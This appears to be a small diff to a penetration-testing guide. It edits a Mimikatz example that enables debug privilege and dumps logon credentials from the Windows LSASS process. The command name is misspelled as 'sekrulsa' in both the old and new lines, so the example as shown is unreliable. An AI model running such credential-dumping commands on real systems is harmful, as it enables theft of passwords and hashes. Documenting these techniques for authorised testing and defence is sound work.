@@ -65,7 +65,7 @@ We can also use Mimikatz to dump the contents of the LSASS process.
 ```powershell
 C:\> mimikatz.exe
 mimikatz # privilege::debug
-mimikatz # sekrulsa
+mimikatz # sekrulsa::logonpasswords
 ```
 {% endcode %}
 
